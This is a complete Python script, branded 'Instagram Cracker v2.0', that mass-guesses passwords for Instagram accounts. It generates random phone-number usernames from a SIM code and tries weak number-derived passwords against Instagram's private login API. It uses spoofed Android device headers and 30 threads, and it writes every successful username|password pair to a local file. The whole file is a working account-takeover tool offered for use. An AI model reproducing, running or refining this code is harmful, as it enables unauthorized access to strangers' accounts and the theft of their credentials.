#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Instagram Cracker - Enhanced Version
Fixed and optimized with cloning functionality
Author: BITHIKA
Version: 2.0
"""

import random
import sys
import time
import hashlib
import uuid
import urllib.request
import requests
import string
import os
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
# Global variables with proper initialization
loop = 0
oks = []
cps = []
idz = []

# Thread-safe locks
counter_lock = threading.Lock()
success_lock = threading.Lock()

def clear():
    """Cross-platform terminal screen clearing"""
    try:
        os.system('cls' if os.name == 'nt' else 'clear')
    except Exception:
        # Fallback for systems without clear command
        print('\n' * 100)

def linex():
    """Print decorative line separator"""
    print(f"\033[1;97m{'='*56}")

def generate_device_hash(uid, pw):
    """Generate device hash for Instagram API"""
    hash_obj = hashlib.md5()
    hash_obj.update(f"{uid}{pw}".encode('utf-8'))
    hex_digest = hash_obj.hexdigest()
    hash_obj.update(f"{hex_digest}12345".encode('utf-8'))
    return hash_obj.hexdigest()

def save_success(uid, pw):
    """Thread-safe function to save successful login"""
    try:
        # Try SD card path first
        output_dir = "/sdcard/XYZ"
        fallback_dir = "XYZ"
        
        try:
            os.makedirs(output_dir, exist_ok=True)
            filepath = os.path.join(output_dir, "RANDOM_OK.txt")
        except (OSError, PermissionError):
            # Fallback to local directory
            os.makedirs(fallback_dir, exist_ok=True)
            filepath = os.path.join(fallback_dir, "RANDOM_OK.txt")
        
        with open(filepath, "a", encoding='utf-8') as f:
            f.write(f"{uid}|{pw}\n")
        
        # Thread-safe add to success list
        with success_lock:
            oks.append(uid)
            
    except Exception as e:
        print(f"\r\033[1;91m[Save Error] Failed to save result: {e}")

def crack(uid, password_list, total_count):
    """Enhanced Instagram account cracking function"""
    
    # Thread-safe counter increment
    with counter_lock:
        global loop
        loop += 1
    
    colors = ["\033[1;90m", "\033[1;91m", "\033[1;92m", "\x1b[38;5;208m", 
              "\033[1;93m", "\033[1;94m", "\033[1;95m", "\033[1;96m"]
    
    try:
        for pw in password_list:
            # Display progress
            color = random.choice(colors)
            with counter_lock:
                progress = loop
                success_count = len(oks)
                fail_count = len(cps)
                percentage = (progress / float(total_count) * 100) if total_count > 0 else 0
            
            sys.stdout.write(f"\r{color}[CRACKING] {progress} \033[1;92m{success_count}\033[1;97m/\033[1;91m{fail_count} \033[1;97m[\033[1;93m{percentage:.1f}%\033[1;97m]                   ")
            sys.stdout.flush()
            
            # Create session and generate device hash
            session = requests.Session()
            device_hash = generate_device_hash(uid, pw)
            headers = {
            'host': 'i.instagram.com',
            'x-ig-app-locale': 'in_ID',
            'x-ig-device-locale': 'in_ID',
            'x-ig-mapped-locale': 'id_ID',
            'x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-3',
            'x-pigeon-rawclienttime': '{:.3f}'.format(time.time()),
            'x-bloks-version-id': 'c55a52bd095e76d9a88e2142eaaaf567c093da6c0c7802e7a2f101603d8a7d49',
            'x-ig-www-claim': '0',
            'x-bloks-is-prism-enabled': 'false',
            'x-bloks-is-layout-rtl': 'false',
            'x-ig-device-id': str(uuid.uuid4()),
            'x-ig-family-device-id': str(uuid.uuid4()),
            'x-ig-android-id': f'android-{device_hash[:16]}',
            'x-fb-connection-type': 'MOBILE.LTE',
            'x-ig-connection-type': 'MOBILE(LTE)',
            'x-ig-capabilities': '3brTv10=',
            'priority': 'u=3',
            'user-agent': 'Mozilla/5.0 (Linux; Android 15; SM-S906U1 Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/141.0.7390.124 Mobile Safari/537.36 Instagram 408.0.0.0.45 Android (35/15; 450dpi; 1080x2340; samsung; SM-S906U1; g0q; qcom; es_LA; 827194262; IABMV/1)',
            'accept-language': 'id-ID, en-US',
            'x-mid': '',
            'ig-intended-user-id': '0',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'x-fb-http-engine': 'Liger',
            'x-fb-client-ip': 'True',
            'x-fb-server-cluster': 'True',
            'x-ig-bandwidth-speed-kbps': str(random.randint(100,300)),
            'x-ig-bandwidth-totalbytes-b': str(random.randint(500000,900000)),
            'x-ig-bandwidth-totaltime-ms': str(random.randint(1000,9000)),
            'x-ig-app-id': '3419628305025917',
            'x-pigeon-rawclienttime': str(round(time.time(), 3)),
            'connection': 'keep-alive'
            }
            payload = {'params': '{"client_input_params":{"device_id":"'+ str(headers['x-ig-android-id']) +'","lois_settings":{"lois_token":"","lara_override":""},"name":"'+str(uid)+'","machine_id":"'+str(headers['x-mid'])+'","profile_pic_url":null,"contact_point":"'+str(uid)+'","encrypted_password":"#PWD_INSTAGRAM:0:'+str(int(time.time()))+':'+str(pw)+'"},"server_params":{"is_from_logged_out":0,"layered_homepage_experiment_group":null,"INTERNAL__latency_qpl_marker_id":36707139,"family_device_id":"'+str(headers['x-ig-family-device-id'])+'","device_id":"'+str(headers['x-ig-device-id'])+'","offline_experiment_group":null,"INTERNAL_INFRA_THEME":"harm_f","waterfall_id":"'+str(uuid.uuid4())+'","login_source":"Login","INTERNAL__latency_qpl_instance_id":73767726200338,"is_from_logged_in_switcher":0,"is_platform_login":0}}','bk_client_context': '{"bloks_version":"'+ str(headers['x-bloks-version-id']) +'","styles_id":"instagram"}','bloks_versioning_id': str(headers['x-bloks-version-id'])}
            encode = ('params=%s&bk_client_context=%s&bloks_versioning_id=%s'%(urllib.parse.quote(payload['params']), urllib.parse.quote(payload['bk_client_context']), payload['bloks_versioning_id']))
            # Update headers with content length and cookies
            headers.update({
                'content-length': str(len(payload)),
                'cookie': ";".join([f"{k}={v}" for k, v in session.cookies.get_dict().items()])
            })
            
            # Make API request
            response = session.post(
                'https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_google_smartlock_login_request/',
                data=encode,
                headers=headers,
                timeout=30,
                allow_redirects=True
            )
            
            # Check response
            if 'logged_in_user' in response.text:
                print(f"\r\033[1;92m [✓ SUCCESS] {uid} | {pw}")
                save_success(uid, pw)
                return True
            elif 'challenge_required' in response.text:
                print(f"\r\033[1;93m [⚠ CHALLENGE] {uid} | {pw}")
                continue
            elif 'checkpoint_required' in response.text:
                print(f"\r\033[1;93m [⚠ CHECKPOINT] {uid} | {pw}")
                continue
            else:
                #print(f"\r\033[1;91m [ERROR] - Status code {response.status_code}")
                continue
                
    except requests.exceptions.Timeout:
        print(f"\r\033[1;91m [Timeout] {uid} - Request timed out")
        return False
    except requests.exceptions.ConnectionError:
        time.sleep(5)
        return False
    except requests.exceptions.RequestException as e:
        #print(f"\r\033[1;91m [Request Error] {uid} - {str(e)[:50]}")
        return False
    except KeyboardInterrupt:
        print(f"\r\033[1;93m [Interrupted] User stopped the process")
        raise
    except Exception as e:
        print(f"\r\033[1;91m [Unexpected Error] {uid} - {str(e)[:50]}")
        return False
    
    return False

def generate_random_ids(limit):
    """Generate random 6-digit IDs"""
    idz.clear()
    for _ in range(limit):
        random_id = "".join(random.choice(string.digits) for _ in range(6))
        idz.append(random_id)
    return idz

def get_password_patterns(uid):
    """Generate password patterns based on UID"""
    return [
        '57273200',  # Static common password
        uid[:6],     # First 6 digits
        uid[:8],     # First 8 digits
        uid,         # Full number
    ]

def random_number():
    """Main random number cloning function"""
    clear()
    
    print(f"\033[1;96m{'='*56}")
    print(f"\033[1;96m     🎯 INSTAGRAM RANDOM NUMBER CLONING 🎯")
    print(f"\033[1;96m{'='*56}")
    print(f" \033[1;97m[\033[1;92m•\033[1;97m] Available Codes: \033[1;92m7679, 7872, 9883, 8017")
    print(f" \033[1;97m[\033[1;92m•\033[1;97m] Suggested Limits: \033[1;92m1000, 2000, 5000, 10000")
    linex()
    
    # Get user input
    code = input(f" \033[1;97m[\033[1;92m?\033[1;97m] Enter SIM Code: \033[1;92m").strip()
    # get user limit
    try:
        limit = int(input(f" \033[1;97m[\033[1;92m?\033[1;97m] Enter Limit: \033[1;92m"))
        if limit <= 0:
            raise ValueError
    except ValueError:
        print(f" \033[1;91m[!] Invalid limit. Using default: 99999")
        limit = 99999
        time.sleep(2)
    
    # Generate random IDs
    print(f" \033[1;93m[*] Generating {limit} random IDs...")
    generate_random_ids(limit)
    
    # Reset global counters
    global loop, oks, cps
    with counter_lock:
        loop = 0
    with success_lock:
        oks.clear()
    cps.clear()
    
    # Display start information
    clear()
    print(f"\033[1;96m{'='*56}")
    print(f"\033[1;96m     🔥 STARTING INSTAGRAM CLONING 🔥")
    print(f"\033[1;96m{'='*56}")
    print(f' \033[1;32m(✓) \033[1;37mTotal IDs Generated: \033[1;32m{len(idz):,}')
    print(f' \033[1;35m(+) \033[1;37mSIM Code: \033[1;32m{code}')
    print(f" \x1b[38;5;208m(!) \x1b[38;5;205mTip: Use Flight Mode for better speed!")
    print(f' \033[1;33m[•] \033[1;37mResults will be saved to: \033[1;32mXYZ/RANDOM_OK.txt')
    linex()
    
    # Start multi-threaded attack
    start_time = time.time()
    
    with ThreadPoolExecutor(max_workers=30) as executor:
        futures = []
        
        for random_id in idz:
            uid = code + random_id
            password_patterns = get_password_patterns(uid)
            future = executor.submit(crack, uid, password_patterns, len(idz))
            futures.append(future)
        
        # Wait for all tasks to complete
        for future in as_completed(futures):
            try:
                future.result()
            except KeyboardInterrupt:
                print(f"\n\033[1;93m[!] Interrupted by user. Shutting down...")
                executor.shutdown(wait=False)
                return
            except Exception as e:
                print(f"\n\033[1;91m[!] Task failed: {e}")
    
    # Calculate execution time
    end_time = time.time()
    execution_time = end_time - start_time
    
    # Display results
    linex()
    print(f"\033[1;92m{'='*56}")
    print(f" \033[1;92m[✓] PROCESS COMPLETED SUCCESSFULLY!")
    print(f"\033[1;92m{'='*56}")
    print(f" \033[1;97m[📊] Total Accounts Tested: \033[1;92m{len(idz):,}")
    print(f" \033[1;97m[✅] Successful Logins: \033[1;92m{len(oks)}")
    print(f" \033[1;97m[❌] Failed Attempts: \033[1;91m{len(cps)}")
    print(f" \033[1;97m[⏱️] Execution Time: \033[1;93m{execution_time:.2f} seconds")
    print(f" \033[1;97m[🚀] Speed: \033[1;94m{len(idz)/execution_time:.2f} IDs/second")
    
    if len(oks) > 0:
        print(f" \033[1;92m[🎉] SUCCESS! Found {len(oks)} working accounts!")
    else:
        print(f" \033[1;91m[😞] No successful logins found this time.")
    
    linex()
    input(f" \033[1;97m[\033[1;91m!\033[1;97m] Press Enter to return to menu...")

def menu():
    """Interactive main menu"""
    while True:
        clear()
        print(f"\033[1;96m{'='*56}")
        print(f"\033[1;96m     🚀 INSTAGRAM CRACKER v2.0 - ENHANCED 🚀")
        print(f"\033[1;96m{'='*56}")
        print(f" \033[1;97m[\033[1;92m1\033[1;97m] 🎯 Random Number Cloning")
        print(f" \033[1;97m[\033[1;92m2\033[1;97m] 📊 View Statistics")
        print(f" \033[1;97m[\033[1;92m3\033[1;97m] ❌ Exit Program")
        print(f"\033[1;96m{'='*60}")
        
        choice = input(f" \033[1;97m[\033[1;92m?\033[1;97m] Select Option: \033[1;92m").strip()
        
        if choice == '1':
            random_number()
        elif choice == '2':
            clear()
            print(f"\033[1;96m{'='*56}")
            print(f"\033[1;96m     📊 PROGRAM STATISTICS 📊")
            print(f"\033[1;96m{'='*56}")
            print(f" \033[1;97m[✅] Total Successful: \033[1;92m{len(oks)}")
            print(f" \033[1;97m[❌] Total Failed: \033[1;91m{len(cps)}")
            print(f" \033[1;97m[📝] Generated IDs: \033[1;93m{len(idz)}")
            print(f" \033[1;97m[🔄] Current Progress: \033[1;94m{loop}")
            linex()
            input(f" \033[1;97m[\033[1;91m!\033[1;97m] Press Enter to continue...")
        elif choice == '3':
            clear()
            print(f"\033[1;92m{'='*56}")
            print(f" \033[1;92m     👋 GOODBYE! THANKS FOR USING OUR TOOL! 👋")
            print(f"\033[1;92m{'='*56}")
            print(f" \033[1;93m[!] Results saved in: XYZ/RANDOM_OK.txt")
            print(f" \033[1;93m[!] Total successful accounts: {len(oks)}")
            time.sleep(3)
            break
        else:
            print(f" \033[1;91m[!] Invalid option! Please choose 1, 2, or 3.")
            time.sleep(2)

if __name__ == "__main__":
    try:
        # Check for required modules
        required_modules = ['requests', 'urllib.request']
        missing_modules = []
        
        for module in required_modules:
            try:
                __import__(module)
            except ImportError:
                missing_modules.append(module)
        
        if missing_modules:
            print(f"\033[1;91m[!] Missing required modules: {', '.join(missing_modules)}")
            print(f"\033[1;91m[!] Please install them using: pip install {' '.join(missing_modules)}")
            sys.exit(1)
        
        # Start the main menu
        menu()
        
    except KeyboardInterrupt:
        clear()
        print(f"\n\033[1;93m[!] Program interrupted by user. Goodbye!")
        sys.exit(0)
    except Exception as e:
        clear()
        print(f"\n\033[1;91m[!] Fatal error occurred: {e}")
        sys.exit(1)
